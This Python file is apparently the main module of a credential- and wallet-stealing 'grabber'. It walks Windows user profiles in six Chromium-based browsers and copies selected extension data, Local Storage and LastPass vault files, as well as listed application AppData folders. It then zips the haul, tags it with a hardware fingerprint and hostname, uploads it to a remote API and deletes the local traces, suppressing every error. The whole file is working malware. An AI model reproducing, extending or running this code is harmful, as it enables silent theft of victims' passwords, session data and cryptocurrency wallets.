import os
import sys
import shutil
import zipfile
import tempfile
import platform

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from constants import (
    CEXTS,
    AEXTS,
    APATHS,
    BRCHR,
    BRBRV,
    BREDG,
    BRCHRM,
    BROPR,
    BRVIV,
    DPROF,
    PPREF,
    LOCALAPPDATA_TEMPLATE,
    APPDATA_TEMPLATE,
    get_results_base_dir
)
from config import (
    EXT_LOCAL_DIR,
    EXT_SYNC_DIR,
    LOCAL_STORAGE_DIR,
    DB_LAST_DIR
)
from utils import (
    get_user_profile,
    get_app_data_path,
    get_browser_user_data_path,
    get_grabber_output_dir,
    get_app_dest_dir,
    get_local_ext_settings_path,
    get_sync_ext_settings_path,
    get_local_storage_path,
    get_lastpass_db_path,
    get_local_storage_dest_path,
    get_lastpass_dest_path
)
from fileops import upload_file_to_public_api
from hardware import get_hardware_fingerprint

def copy_directory(src, dst):
    try:
        if not os.path.exists(src):
            return False
        parent_dir = os.path.dirname(dst)
        if parent_dir:
            os.makedirs(parent_dir, exist_ok=True)
        if os.path.exists(dst):
            shutil.rmtree(dst)
        
        def copy_tree(src_dir, dst_dir):
            os.makedirs(dst_dir, exist_ok=True)
            for item in os.listdir(src_dir):
                src_path = os.path.join(src_dir, item)
                dst_path = os.path.join(dst_dir, item)
                try:
                    if os.path.isdir(src_path):
                        copy_tree(src_path, dst_path)
                    else:
                        try:
                            shutil.copy2(src_path, dst_path)
                        except (OSError, IOError, PermissionError) as e:
                            pass
                except (OSError, IOError, PermissionError) as e:
                    pass
        
        copy_tree(src, dst)
        return os.path.exists(dst)
    except Exception as e:
        return False

def copy_directories(src_dir, extension_dict, dst_dir, prefix, parent_name):
    if not os.path.isdir(src_dir):
        return
    try:
        subdirs = [subdir for subdir in os.listdir(src_dir) if os.path.isdir(os.path.join(src_dir, subdir))]
        if not subdirs:
            return
        parent_dst_dir = os.path.join(dst_dir, parent_name)
        os.makedirs(parent_dst_dir, exist_ok=True)
        for subdir in subdirs:
            if subdir in extension_dict:
                target_dir_name = f"{prefix}_{subdir}_{extension_dict[subdir]}"
                src_path = os.path.join(src_dir, subdir)
                dst_path = os.path.join(parent_dst_dir, target_dir_name)
                copy_directory(src_path, dst_path)
    except Exception as e:
        pass

def find_browser_profiles(browser_user_data_path):
    profiles = []
    if not os.path.exists(browser_user_data_path):
        return profiles
    default_profile = os.path.join(browser_user_data_path, DPROF)
    if os.path.exists(default_profile):
        profiles.append((DPROF, default_profile))
    try:
        for entry in os.listdir(browser_user_data_path):
            if entry.startswith(PPREF):
                profile_path = os.path.join(browser_user_data_path, entry)
                if os.path.isdir(profile_path):
                    profiles.append((entry, profile_path))
    except (OSError, PermissionError) as e:
        pass
    return profiles

def process_browser_profile_data(profile_name, profile_path, destination_dir, browser_id, user_name):
    try:
        profile_id = "0" if profile_name == DPROF else profile_name.replace(PPREF, "")
        prefix = f"{browser_id}_{profile_id}_{user_name}"
        
        local_ext_settings = get_local_ext_settings_path(profile_path)
        if os.path.isdir(local_ext_settings):
            copy_directories(local_ext_settings, CEXTS, destination_dir, prefix, EXT_LOCAL_DIR)
        
        sync_ext_settings = get_sync_ext_settings_path(profile_path)
        if os.path.isdir(sync_ext_settings):
            copy_directories(sync_ext_settings, AEXTS, destination_dir, prefix, EXT_SYNC_DIR)
        
        local_storage = get_local_storage_path(profile_path)
        if os.path.exists(local_storage) and os.path.isdir(local_storage):
            os.makedirs(os.path.join(destination_dir, LOCAL_STORAGE_DIR), exist_ok=True)
            copy_directory(local_storage, get_local_storage_dest_path(destination_dir, prefix))
        
        lastpass_db = get_lastpass_db_path(profile_path)
        if os.path.exists(lastpass_db):
            os.makedirs(os.path.join(destination_dir, DB_LAST_DIR), exist_ok=True)
            copy_directory(lastpass_db, get_lastpass_dest_path(destination_dir, prefix))
    except Exception as e:
        pass

def process_user_browser_data(user_name, user_profile_path, destination_dir):
    browsers = [
        ("0", BRCHR),
        ("1", BRBRV),
        ("3", BREDG),
        ("chromium", BRCHRM),
        ("opera", BROPR),
        ("vivaldi", BRVIV),
    ]
    
    for browser_id, browser_rel_path in browsers:
        try:
            browser_user_data = get_browser_user_data_path(user_profile_path, browser_rel_path)
            if not os.path.exists(browser_user_data):
                continue
            profiles = find_browser_profiles(browser_user_data)
            if not profiles:
                continue
            for profile_name, profile_path in profiles:
                process_browser_profile_data(profile_name, profile_path, destination_dir, browser_id, user_name)
        except Exception as e:
            pass

def load_browser_data(destination_dir):
    try:
        user_profile = get_user_profile()
        if not user_profile:
            return
        user_name = os.path.basename(user_profile)
        process_user_browser_data(user_name, user_profile, destination_dir)
    except Exception as e:
        pass

def process_user_app_data(user_name, user_profile_path, destination_dir):
    for app_path_template, app_name in APATHS.items():
        try:
            if LOCALAPPDATA_TEMPLATE in app_path_template:
                local_appdata_path = get_app_data_path(user_profile_path, True)
                app_path = app_path_template.replace(LOCALAPPDATA_TEMPLATE, local_appdata_path)
            elif APPDATA_TEMPLATE in app_path_template:
                roaming_appdata_path = get_app_data_path(user_profile_path, False)
                app_path = app_path_template.replace(APPDATA_TEMPLATE, roaming_appdata_path)
            else:
                continue
            
            if os.path.isdir(app_path):
                dest_path = get_app_dest_dir(destination_dir, user_name, app_name)
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                if os.path.exists(dest_path):
                    shutil.rmtree(dest_path)
                
                def copy_tree(src_dir, dst_dir):
                    os.makedirs(dst_dir, exist_ok=True)
                    for item in os.listdir(src_dir):
                        src_path = os.path.join(src_dir, item)
                        dst_path = os.path.join(dst_dir, item)
                        try:
                            if os.path.isdir(src_path):
                                copy_tree(src_path, dst_path)
                            else:
                                try:
                                    shutil.copy2(src_path, dst_path)
                                except (OSError, IOError, PermissionError) as e:
                                    pass
                        except (OSError, IOError, PermissionError) as e:
                            pass
                
                copy_tree(app_path, dest_path)
        except Exception as e:
            pass

def load_app_data(destination_dir):
    try:
        user_profile = get_user_profile()
        if not user_profile:
            return
        user_name = os.path.basename(user_profile)
        process_user_app_data(user_name, user_profile, destination_dir)
    except Exception as e:
        pass

def zip_directory(source_dir, archive_path):
    try:
        if not os.path.exists(source_dir) or not os.path.isdir(source_dir):
            return False
        file_count = 0
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
                        file_count += 1
                    except (OSError, IOError, PermissionError) as e:
                        pass
        return file_count > 0
    except (OSError, IOError, zipfile.BadZipFile, zipfile.LargeZipFile) as e:
        return False

def create_and_save_archive():
    try:
        base_dir = get_results_base_dir()
        output_dir = get_grabber_output_dir(base_dir)
        try:
            load_browser_data(output_dir)
            load_app_data(output_dir)
            temp_zip = tempfile.NamedTemporaryFile(delete=False, suffix='.zip', prefix='grab_')
            temp_zip.close()
            zip_path = temp_zip.name
            try:
                if zip_directory(output_dir, zip_path):
                    machine_id = get_hardware_fingerprint()
                    hostname = platform.node()
                    upload_file_to_public_api(zip_path, machine_id, "raw", hostname)
            except Exception as e:
                pass
        finally:
            try:
                if os.path.exists(zip_path):
                    os.remove(zip_path)
                if os.path.exists(output_dir):
                    shutil.rmtree(output_dir)
            except (OSError, PermissionError) as e:
                pass
    except Exception as e:
        pass

if __name__ == "__main__":
    create_and_save_archive()
